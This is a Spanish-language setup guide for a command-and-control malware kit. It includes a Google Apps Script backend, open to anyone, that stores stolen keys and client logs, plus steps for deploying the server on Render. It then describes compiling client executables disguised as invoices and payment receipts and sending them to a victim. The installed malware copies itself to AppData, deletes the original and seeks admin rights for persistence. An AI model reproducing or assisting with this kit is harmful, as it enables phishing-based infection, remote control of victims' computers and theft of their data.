# 📦 Instrucciones de Despliegue e Instalación

## 1. Configuración de la Base de Datos (Google Sheets)
Para evitar la pérdida de claves cuando el servidor gratuito de Render se reinicia, usaremos Google Sheets como base de datos persistente.

### Paso 1: Crear el Script
1.  Ve a [Google Sheets](https://sheets.new) y crea una nueva hoja llamada `C2_Database`.
2.  Ve al menú **Extensiones** > **Apps Script**.
3.  Borra el código existente y pega el siguiente **Script de Persistencia**:

```javascript
/* C2 Persistence API - Pegar esto en Google Apps Script */
const SHEET_ID = SpreadsheetApp.getActiveSpreadsheet().getId();

function doPost(e) {
  const lock = LockService.getScriptLock();
  lock.tryLock(10000);
  
  try {
    const data = JSON.parse(e.postData.contents);
    const sheetName = data.type || "Logs"; // Puede ser 'Keys', 'Clients', 'Logs'
    const ss = SpreadsheetApp.openById(SHEET_ID);
    let sheet = ss.getSheetByName(sheetName);
    
    // Crear hoja si no existe
    if (!sheet) {
      sheet = ss.insertSheet(sheetName);
      sheet.appendRow(["Timestamp", ...Object.keys(data.payload)]); // Headers
    }
    
    // Guardar datos
    const row = [new Date(), ...Object.values(data.payload)];
    sheet.appendRow(row);
    
    return ContentService.createTextOutput(JSON.stringify({result: "success"}));
  } catch (e) {
    return ContentService.createTextOutput(JSON.stringify({result: "error", error: e.toString()}));
  } finally {
    lock.releaseLock();
  }
}

function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({status: "alive", version: "1.0"}));
}
```

### Paso 2: Desplegar como API
1.  En Apps Script, haz clic en **"Implementar" (Deploy)** > **"Nueva implementación"**.
2.  Tipo: **Aplicación web**.
3.  Descripción: `C2 API`.
4.  Quién tiene acceso: **Cualquier usuario** (Esto es CRÍTICO para que el servidor pueda escribir sin login).
5.  Copia la **URL de la aplicación web** generada (empieza por `https://script.google.com/macros/s/...`).

---

## 2. Instalación del Servidor (PC Atacante / Render)

### Opción A: Render (Recomendado)
1.  Sube este código a tu repositorio de GitHub.
2.  Crea un nuevo **Web Service** en Render.com conectado a tu repo.
3.  En "Environment Variables" añade (opcional):
    *   `GOOGLE_SCRIPT_URL`: La URL que copiaste en el paso anterior.
4.  El autodespliegue se encargará del resto usando `render.yaml`.

### Opción B: Local (Pruebas)
1.  Instalar dependencias:
    ```bash
    npm install
    ```
2.  Iniciar servidor:
    ```bash
    npm start
    ```

---

## 3. Compilación del Cliente (Malware)

### Requisitos Previoss
*   Tener Node.js instalado.
*   Conocer la URL de tu servidor (ej. `https://mi-proyecto-c2.onrender.com` o `http://localhost:3000`).

### Pasos de Compilación
1.  Edita `cliente.js` y asegúrate de que tu URL esté en la lista `SERVERS` o usa variables de entorno.
2.  Ejecuta el script de construcción automatizado:
    ```bash
    npm run build-client
    ```
3.  El sistema intentará generar varios ejecutables kamikaze en la carpeta `dist/`:
    *   `Factura_Electronica_Enero2026.exe` (Prioridad)
    *   `Comprobante_Pago_2026.exe` (Secundario)

---

## 4. Infección (PC Víctima)

1.  Envía el ejecutable `.exe` generado a la máquina objetivo (VM de pruebas).
2.  Ejecútalo (Doble clic).
    *   Si pide permisos de Administrador (UAC), **Aceptar** para persistencia completa.
    *   Si se deniega, funcionará en modo usuario limitado.
3.  El malware se copiará a `%APPDATA%` y se borrará del escritorio (simulando un instalador).
4.  Verifica en el Dashboard Web que el cliente aparezca conectado "Online".